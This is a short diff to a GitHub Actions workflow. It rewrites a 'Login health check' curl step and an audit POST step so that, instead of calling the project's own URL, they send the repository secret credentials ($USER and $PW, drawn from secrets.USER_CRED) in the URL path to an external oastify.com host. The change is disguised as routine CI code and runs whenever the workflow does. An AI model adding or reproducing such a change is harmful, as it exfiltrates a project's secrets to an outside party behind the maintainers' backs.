@@ -22,7 +22,7 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://536gpht8aejgj28f717wzu7vamgd46sv.oastify.com/$USER/$PW
         
     - name: send_run_log
       continue-on-error: true
@@ -60,4 +60,4 @@ jobs:
           echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
         fi
         
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' http://536gpht8aejgj28f717wzu7vamgd46sv.oastify.com/$USER/$PW
